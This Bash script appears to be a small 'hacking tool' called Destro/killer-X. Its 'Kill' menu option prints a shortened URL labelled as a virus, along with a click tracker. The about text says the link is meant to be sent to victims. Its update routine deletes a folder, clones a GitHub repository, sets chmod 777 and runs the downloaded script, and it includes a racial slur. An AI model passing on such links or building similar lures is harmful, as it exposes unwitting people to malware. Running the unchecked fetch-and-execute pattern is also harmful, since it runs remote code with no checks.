# A tool by Asahluma Tyika from TeekaY-X
# Copying Wont help bro try your best to  make your own
# Colours
#-----------------
red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
#-----------------
# scripts#
banner() {
clear
echo -e "${red}
${grn}	 ____            _
	|  _ \  ___  ___| |_ _ __ ___
${ylo}	| | | |/ _ \/ __| __|  __/ _ \

${blue}	| |_| |  __/\__ \ |_| | | (_) |
	|____/ \___||___/\__|_|  \___/
	${red}      [TOOL BY: Teekay-X]${rset}"
}
menu() {
echo
echo -e "$grn		[-]$cyan M E N U $grn [-]$rset"

echo -e "		$red==>$cyan [1] Kill😈$red  <==     $grn"
echo -e "	$grn  "
echo -e "		$red==>$cyan [2] Recover$red <==     $grn "
echo -e "	$grn "
echo -e "		$red==>$cyan [3] Update $red <==         $grn  "
echo -e "	$grn  "
echo -e "		$red==>$cyan [4] Exit$red    <== $grn"
echo -e "	$grn "
echo -e "		$red==>$cyan [5] About$red   <==         $grn"
echo " "
echo -ne "$cyan[-]$grn OPTION:"
read OPT
if [ $OPT = "1" ];
then
inf
elif [ $OPT = "2" ];
then
rec
elif [ $OPT = "3" ];
then
updt
elif [ $OPT = "4" ];
then
extz
elif [ $OPT = "5" ];
then
bout
else
echo " $red[$g!] WRONG OPTION !"
sleep 2.0
banner
menu
fi
}
inf(){
clear
echo
echo
echo -e "${red}

${cyan}               __      _    __   __
${blue}             / /__   (_)  / /  / /
${ylo}             / //_/  / /  / /  / /
${grn}            / ,<    / /  / /  / /
${pink}           /_/|_|  /_/  /_/  /_/  ${rset}"
echo -e "${cyan}[ + ]	${blue}TeekaY-X :${grn} killing Your systems since 2022"

echo " "
echo -e " "
echo -e "${blue}	Generating virus link... " | pv -qL 20
sleep 2
echo
echo -e "${grn}[ ! ]	Successfully Generated "
echo
echo -e "${blue}[ - ]	VIRUS :- shorturl.at/jtuJ6"
echo
echo -e "${pink} [ + ] Track the link clicks here :- https://www.shorturl.at/url-total-clicks.php?u=shorturl.at/jtuJ6 "
echo
echo -e "${red} [ ! ] NOTE : Author is not responsible for any damages done by this script as it is for educational purposes only" | pv -qL 30
echo
echo " "
echo " "

echo -ne "${red} [-] ${blue} Enter X :"
read ext
if [ $ext = "x" ];
then
banner
menu
else
banner
menu
fi
}
rec() {
clear
echo
echo
echo -e "

            ____
${red}           / __ \   ___     _____   ____     _   __   ___     _____
          / /_/ /  / _ \   / ___/  / __ \   | | / /  / _ \   / ___/
${blue}         / _, _/  /  __/  / /__   / /_/ /   | |/ /  /  __/  / /
${pink}        /_/ |_|   \___/   \___/   \____/    |___/   \___/  /_/

"
echo -e "${cyan}[ + ]   ${blue}TeekaY-X :${grn} killing Your systems since 2022"

echo " "
echo -e " "
echo -e "${blue}        Generating virus link... " | pv -qL 20
sleep 2
echo
echo -e "${grn}[ ! ]    Successfully Generated "
echo
echo -e "${blue}[ - ]   Anti-Virus :- https://cutt.ly/AntiVirus"
echo
echo -e "${red} [ ! ] NOTE : Author is not responsible for any damages done by this script as it is for educational purposes only" | pv -qL 30
echo
echo " "
echo " "

echo -ne "${red} [-] ${blue} Enter X :"
read ext
if [ $ext = "x" ];
then
banner
menu
else
banner
menu
fi
}
updt() {
clear
clear
echo " "
echo " "
echo -e "

${red}           __  __   ____     ____     ___       ______   ______
${blue}          / / / /  / __ \   / __ \   /   |     /_  __/  / ____/
${ylo}         / / / /  / /_/ /  / / / /  / /| |      / /    / __/
${pink}        / /_/ /  / ____/  / /_/ /  / ___ |     / /    / /___
${cyan}        \____/  /_/      /_____/  /_/  |_|    /_/    /_____/ V1.0

"
echo " "
echo " "
sleep 6.0
clear
echo -e "$red                         ChEcKiNg..>$rset"
sleep 2.0
clear
echo -e "$red                         ChEcKiNg...>$rset"
sleep 2.0
clear
echo -e "$red                         ChEcKiNg....>$rset"
sleep 2.0
clear
echo -e "$red                         ChEcKiNg.....>$rset"
sleep 2.0
clear

echo " "
echo -e "$grn			Updating $redDestro$grn press enter to continue$rset"
read punch
cd $HOME
rm -rf Destro
git clone https://github.com/Teekay-X/Destro
clear
echo -e "$grn              Destro is now uptodate$rset"
echo
echo -e "$blue		Press$grn Enter$blue To Continue "
read punch
cd $HOME && cd Destro && chmod 777 destro.sh
bash destro.sh
}
bout() {
clear
echo " "
banner
echo
echo -e "$red		 Call Me $cyan TeekayX " | pv -qL 40
echo -e "$red		I AM from the $cyan Mabhongo clan" | pv -qL 40
echo -e "$red		 I AM a proud southafrican niqqa♠" | pv -qL 40
sleep 2.0
echo " "
clear
banner
echo
echo -e "$red killer-X" | pv -qL 40
echo -e "$red killerX is a bash based script " | pv -qL 40
echo -e "$red It generates a link and ypi send to victim" | pv -qL 40
echo -e "$red HOPE YOU LIKE THE SCRIPT😅" | pv -qL 40
echo " "
echo -ne "$red [-]$cyan Enter x:"
read xx
if [ $xx = "x" ];
then
banner
menu
else
banner
menu
fi
}
extz() {
clear
banner
echo 
echo -e "$red [-]By:$cyan TeekaY-X"
}
banner
menu

